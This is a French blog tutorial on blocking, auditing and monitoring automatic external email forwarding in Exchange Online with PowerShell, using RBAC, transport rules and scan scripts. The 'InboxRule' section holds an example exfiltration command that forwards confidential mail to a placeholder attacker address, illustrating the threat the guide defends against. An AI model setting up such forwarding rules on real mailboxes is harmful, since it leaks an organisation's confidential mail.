---
title: "Exchange Online : bloquer les transferts email automatiques avec PowerShell (2026)"
description: "Bloquer les transferts automatiques dans Exchange Online avec PowerShell : Transport Rules, audit RBAC et script de monitoring prêts à l'emploi."
pubDatetime: "2025-06-14T20:02:20+02:00"
modDatetime: "2026-05-17T00:00:00+01:00"
author: Brandon Visca
tags:
  - microsoft-365
  - securite
  - powershell
  - exchange-online
  - intermediaire
  - guide
featured: false
draft: false
focusKeyword: Exchange Online
faqs:
  - question: "Comment bloquer les transferts automatiques dans Exchange Online ?"
    answer: "Crée une Transport Rule PowerShell : New-TransportRule -MessageType AutoForward -SentToScope NotInOrganization -RejectMessageReasonText '...'. C'est le blocage réel, applicable à tout le tenant en quelques secondes."
  - question: "Le RBAC bloque-t-il vraiment les transferts dans Exchange Online ?"
    answer: "Non. Le RBAC retire uniquement les boutons dans l'interface OWA. Il ne bloque pas les transferts configurés par un admin PowerShell, ni les InboxRules existantes, ni les redirections déjà actives. Utilise une Transport Rule pour le vrai blocage."
  - question: "Quelle est la différence entre ForwardingAddress et InboxRule dans Exchange Online ?"
    answer: "ForwardingAddress redirige globalement toute la boîte (configurable via OWA ou PowerShell admin). InboxRule est une règle conditionnelle créée par l'utilisateur (filtre sur sujet, expéditeur…). Les deux exfiltrent des données — auditer les deux avec Get-Mailbox et Get-InboxRule."
  - question: "Comment détecter les transferts actifs dans Exchange Online ?"
    answer: "Lance Get-Mailbox -ResultSize Unlimited | Where-Object { $_.ForwardingSmtpAddress -or $_.ForwardingAddress } pour les redirections globales. Et Get-InboxRule sur chaque boîte pour les règles conditionnelles. Exporte en CSV pour analyse."
---
> 💡 **TL;DR** : Crée une Transport Rule PowerShell (`-MessageType AutoForward -SentToScope NotInOrganization`) pour bloquer tous les transferts externes en une commande. Le RBAC ne bloque rien — c'est cosmétique. Audite ensuite avec `Get-Mailbox` + `Get-InboxRule` pour nettoyer les redirections existantes.

![Exchange Online — bloquer les transferts automatiques](great-job-al0xsyu0pkftq.gif)

Les **transferts automatiques d'emails vers l'extérieur** ? Un cauchemar pour tout admin système qui se respecte. Si tu gères un tenant **Exchange Online**, tu as probablement déjà eu cette sueur froide en découvrant qu'un utilisateur a configuré une **redirection email** vers sa boîte perso — avec toutes les données sensibles qui partent en prime.

Microsoft n'a pas exactement facilité les choses avec ses multiples canaux de transfert et ses interfaces qui donnent l'illusion de contrôle. J'ai appliqué cette configuration sur plusieurs tenants clients : avec les bonnes commandes **PowerShell Exchange Online** et une stratégie claire, on verrouille ça proprement.

Dans ce guide, je te montre comment **bloquer efficacement tous les transferts automatiques** dans Exchange Online, détecter ceux déjà en place, et mettre en place un monitoring automatisé.

Microsoft documente les bonnes pratiques de sécurité des flux sortants dans sa [documentation sur les stratégies anti-spam sortantes](https://learn.microsoft.com/fr-fr/microsoft-365/security/office-365-security/outbound-spam-policies-configure).

## Table des matières

- - - - - -

## Pourquoi bloquer les transferts Exchange Online

Avant de foncer dans les commandes, voilà pourquoi c'est un problème concret.

**Fuite de données incontrôlée** : tes emails confidentiels partent vers Gmail, Yahoo ou ailleurs sans traçabilité.

**Contournement des protections** : ATP (Advanced Threat Protection), DLP, audit logs — tout ça devient inutile si les mails sont redirigés avant même le scan.

**Non-conformité RGPD** : l'entreprise perd la maîtrise de l'information. Bonjour l'amende CNIL.

**Vecteur d'exfiltration** : un attaquant peut créer discrètement une règle de transfert pour siphonner tes données après une intrusion. C'est discret, difficile à détecter, et ça dure des semaines si personne ne monitore.

> ⚠️ **Point critique** : Les règles de transfert automatique sont l'un des vecteurs d'exfiltration post-intrusion les plus fréquents dans les incidents M365. Le bloquer en amont coûte 5 minutes. Le détecter après coup peut prendre des semaines.

- - - - - -

## Les deux canaux de transfert à maîtriser

Exchange Online a deux mécanismes distincts pour rediriger automatiquement des emails.

### Redirection globale de boîte (ForwardingAddress)

Redirige **tous** les emails reçus vers une adresse externe. Configurable via OWA (Settings > Mail > Forwarding) ou en PowerShell :

```powershell
Set-Mailbox prenom.nom@domaine.com -ForwardingSmtpAddress "externe@gmail.com"
```

Caractéristiques : redirige tout, facile à détecter via `Get-Mailbox`, configurable par l'utilisateur ou un admin.

### Règles de boîte conditionnelles (InboxRule)

Transfert conditionnel basé sur des critères (expéditeur, sujet, mots-clés). Exemple d'une règle pernicieuse :

```powershell
New-InboxRule -Name "Forward Important" `
  -SubjectContainsWords "Confidentiel" `
  -ForwardTo "attaquant@externe.com"
```

Plus difficiles à détecter, configurables uniquement par l'utilisateur, gérées via `Get-InboxRule`. C'est le canal préféré des attaquants car il cible des données spécifiques.

- - - - - -

## Méthode 1 : RBAC

Le RBAC (Role-Based Access Control) retire les boutons de transfert des interfaces OWA. C'est un premier verrou visuel, mais attention à ses limites.

### Créer le rôle et la policy

```powershell
# Étape 1 : Créer un rôle basé sur MyBaseOptions
New-ManagementRole -Name "MyBaseOptions-NoForward" -Parent "MyBaseOptions"

# Étape 2 : Supprimer les paramètres dangereux
Set-ManagementRoleEntry "MyBaseOptions-NoForward\Set-Mailbox" -RemoveParameter -Parameters @(
    "ForwardingAddress",
    "ForwardingSmtpAddress",
    "DeliverToMailboxAndForward"
)

# Étape 3 : Créer une policy utilisateur
New-RoleAssignmentPolicy -Name "PolicyNoEmailForward" -Roles @(
    "MyContactInformation",
    "MyRetentionPolicies",
    "MyBaseOptions-NoForward",
    "MyTextMessaging"
)

# Étape 4 : Appliquer à une boîte
Set-Mailbox prenom.nom@domaine.com -RoleAssignmentPolicy "PolicyNoEmailForward"
```

### Appliquer en masse

```powershell
Get-Mailbox -RecipientTypeDetails UserMailbox | Set-Mailbox -RoleAssignmentPolicy "PolicyNoEmailForward"
```

> ⚠️ **Limite du RBAC** : Le RBAC ne bloque PAS les transferts configurés par un admin, ni les InboxRules, ni les redirections déjà existantes. C'est cosmétique au niveau interface — pas un blocage réel.

- - - - - -

## Méthode 2 : Transport Rules

C'est le vrai blocage. Une Transport Rule au niveau du tenant intercepte et rejette les emails transférés automatiquement vers l'extérieur, peu importe comment la règle a été créée.

### La règle de base

```powershell
New-TransportRule -Name "Block-Auto-Forwarding" `
  -SentToScope NotInOrganization `
  -FromScope InOrganization `
  -MessageType AutoForward `
  -ExceptIfFrom @("admin@votredomaine.com", "service@votredomaine.com") `
  -RejectMessageReasonText "Le transfert automatique vers l'extérieur est interdit par la politique de sécurité."
```

### Paramètres expliqués

| Paramètre | Description | Pourquoi c'est important |
|---|---|---|
| `FromScope InOrganization` | Emails depuis ton organisation | Évite de bloquer les emails légitimes entrants |
| `SentToScope NotInOrganization` | Destinataire externe | Cible uniquement les sorties vers l'extérieur |
| `MessageType AutoForward` | Messages transférés automatiquement | Distingue transfert auto vs transfert manuel |
| `ExceptIfFrom` | Liste blanche d'expéditeurs | Permet les transferts légitimes (comptes de service) |

### Version avancée avec incident report

```powershell
New-TransportRule -Name "Block-Auto-Forwarding-Advanced" `
  -SentToScope NotInOrganization `
  -FromScope InOrganization `
  -MessageType AutoForward `
  -ExceptIfFrom @("admin@votredomaine.com") `
  -RejectMessageReasonText "Transfert automatique bloqué. Contactez le support IT." `
  -GenerateIncidentReport "admin@votredomaine.com" `
  -IncidentReportContent @("Sender", "Recipients", "Subject", "MessageHeaders")
```

La version avancée génère un rapport d'incident vers l'admin à chaque tentative bloquée. Idéal pour détecter les tentatives d'exfiltration post-intrusion.

- - - - - -

## Audit et détection des transferts actifs

Avant ou après le blocage, audite l'existant. Il peut y avoir des redirections actives depuis des mois.

### Scanner les ForwardingAddress

```powershell
$ForwardingMailboxes = Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
} | Select-Object DisplayName, ForwardingAddress, ForwardingSmtpAddress, PrimarySmtpAddress

$ForwardingMailboxes | Format-Table -AutoSize
$ForwardingMailboxes | Export-Csv "C:\temp\forwarding-audit.csv" -NoTypeInformation
```

### Scanner les InboxRules suspectes

```powershell
$SuspiciousRules = @()

Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Mailbox = $_
    $Rules = Get-InboxRule -Mailbox $Mailbox.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    foreach ($Rule in $Rules) {
        $SuspiciousRules += [PSCustomObject]@{
            Mailbox   = $Mailbox.DisplayName
            Email     = $Mailbox.PrimarySmtpAddress
            RuleName  = $Rule.Name
            ForwardTo = $Rule.ForwardTo -join "; "
            RedirectTo = $Rule.RedirectTo -join "; "
            Enabled   = $Rule.Enabled
        }
    }
}

$SuspiciousRules | Format-Table -AutoSize
$SuspiciousRules | Export-Csv "C:\temp\inbox-rules-audit.csv" -NoTypeInformation
```

Si tu es en train de migrer des archives vers Exchange Online, vérifie aussi qu'aucune règle de transfert n'est active sur les boîtes concernées. Le guide [import PST Outlook 365](https://brandonvisca.com/import-pst-outlook-365-guide-complet/) détaille cette procédure de migration.

### Suppression en masse (avec précaution)

```powershell
# ⚠️ Teste d'abord sur quelques boîtes avant de lancer en masse

# Supprimer toutes les redirections ForwardingAddress
Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
} | Set-Mailbox -ForwardingAddress $null -ForwardingSmtpAddress $null

# Supprimer les InboxRules de transfert
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Rules = Get-InboxRule -Mailbox $_.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    $Rules | Remove-InboxRule -Confirm:$false
}
```

- - - - - -

## Monitoring automatisé

La Transport Rule bloque les futurs transferts, mais quelqu'un peut créer une règle admin qui passe quand même. Un script de monitoring quotidien comble ce gap.

```powershell
# Monitor-EmailForwarding.ps1
param(
    [string]$ReportPath  = "C:\Scripts\Reports",
    [string]$AdminEmail  = "admin@votredomaine.com"
)

Connect-ExchangeOnline -ShowProgress $false

$Date   = Get-Date -Format "yyyy-MM-dd"
$Report = @()

# Scan ForwardingAddress
$ForwardingBoxes = Get-Mailbox -ResultSize Unlimited | Where-Object {
    $_.ForwardingSmtpAddress -or $_.ForwardingAddress
}
foreach ($Box in $ForwardingBoxes) {
    $Report += [PSCustomObject]@{
        Type    = "ForwardingAddress"
        Mailbox = $Box.DisplayName
        Email   = $Box.PrimarySmtpAddress
        Target  = $Box.ForwardingSmtpAddress
        Details = "Redirection globale active"
        Date    = $Date
    }
}

# Scan InboxRules
Get-Mailbox -ResultSize Unlimited | ForEach-Object {
    $Mailbox = $_
    $Rules = Get-InboxRule -Mailbox $Mailbox.Alias | Where-Object {
        $_.ForwardTo -or $_.RedirectTo
    }
    foreach ($Rule in $Rules) {
        $Report += [PSCustomObject]@{
            Type    = "InboxRule"
            Mailbox = $Mailbox.DisplayName
            Email   = $Mailbox.PrimarySmtpAddress
            Target  = ($Rule.ForwardTo + $Rule.RedirectTo) -join "; "
            Details = "Règle: $($Rule.Name)"
            Date    = $Date
        }
    }
}

$ReportFile = "$ReportPath\EmailForwarding-$Date.csv"
$Report | Export-Csv $ReportFile -NoTypeInformation

if ($Report.Count -gt 0) {
    $Subject = "ALERTE : $($Report.Count) transfert(s) d'email détecté(s)"
    $Body    = "Transferts détectés le $Date. Voir fichier joint."
    Send-MailMessage -To $AdminEmail -Subject $Subject -Body $Body `
      -Attachments $ReportFile -SmtpServer "smtp.office365.com" -Port 587 -UseSsl
}

Write-Host "Scan terminé. $($Report.Count) transfert(s) détecté(s)."
```

Planifie ce script dans le Planificateur de tâches Windows ou via Azure Automation pour une exécution quotidienne.

- - - - - -

## Bonnes pratiques et déploiement

### Stratégie de déploiement progressive

1. **Audit** : lance les scripts de scan — recense tout ce qui existe
2. **Liste blanche** : identifie les transferts légitimes (comptes de service, notifications)
3. **RBAC** : applique la policy à tous les utilisateurs
4. **Transport Rule** : déploie en mode audit d'abord (`-Mode Audit`), puis bloquant
5. **Monitoring** : active le script quotidien

### Gérer les exceptions

```powershell
# Ajouter à ExceptIfFrom dans ta Transport Rule
$WhitelistedAccounts = @(
    "noreply@votredomaine.com",       # Comptes de service
    "notifications@votredomaine.com", # Notifications automatiques
    "support@votredomaine.com"        # Support client
)
```

> 💡 **Astuce** : Crée un groupe de sécurité `ForwardingExceptions` dans Azure AD. Gère la liste blanche via le groupe plutôt qu'en dur dans les scripts — la mise à jour est plus propre et auditée.

### Gérer les comptes de la GAL

Si tu gères des boîtes de service ou des comptes techniques, pense aussi à [masquer les utilisateurs sensibles de la GAL Office 365](https://brandonvisca.com/masquer-utilisateurs-gal-office365-active-directory/) — un compte visible dans l'annuaire est plus exposé à l'ingénierie sociale.

### Sécuriser les accès admin

Les mêmes réflexes de [sécurisation de tes accès système](https://brandonvisca.com/securite-de-votre-serveur-linux/) s'appliquent aux comptes admin Exchange : MFA obligatoire, principe du moindre privilège, rotation des credentials de service.

- - - - - -

## Conclusion

Bloquer les transferts automatiques dans Exchange Online prend 10 minutes avec PowerShell. La Transport Rule est ton principal levier — le RBAC ne fait que cacher les boutons. Audite l'existant avant de déployer pour ne pas couper des flux légitimes, construis une liste blanche propre, et planifie le monitoring pour ne pas repartir de zéro après le prochain incident. Pour les tenants avec des flux complexes, déploie la Transport Rule en mode audit d'abord — tu verras exactement ce qui aurait été bloqué avant de passer en mode bloquant.

## Pour aller plus loin

- [Documentation Microsoft — stratégies anti-spam sortantes](https://learn.microsoft.com/fr-fr/microsoft-365/security/office-365-security/outbound-spam-policies-configure)
- [Masquer des utilisateurs de la GAL Office 365](https://brandonvisca.com/masquer-utilisateurs-gal-office365-active-directory/)
- [Import PST dans Outlook 365 : guide complet](https://brandonvisca.com/import-pst-outlook-365-guide-complet/)

## Articles connexes

- [DNS Scavenging Windows Server : automatiser le nettoyage DNS](/dns-scavenging-windows-server-guide-complet/)
- [Importer un fichier PST dans Outlook 365 : 2 méthodes qui marchent (2026)](/import-pst-outlook-365-guide-complet/)
- [Masquer des utilisateurs de la GAL Office 365 + Active Directory : Guide complet](/masquer-utilisateurs-gal-office365-active-directory/)
- [pfSense 2.8 : télécharger l'ISO, mettre à jour et éviter les pièges (2026)](/mise-a-jour-pfsense-2-8-nouveautes-installation/)
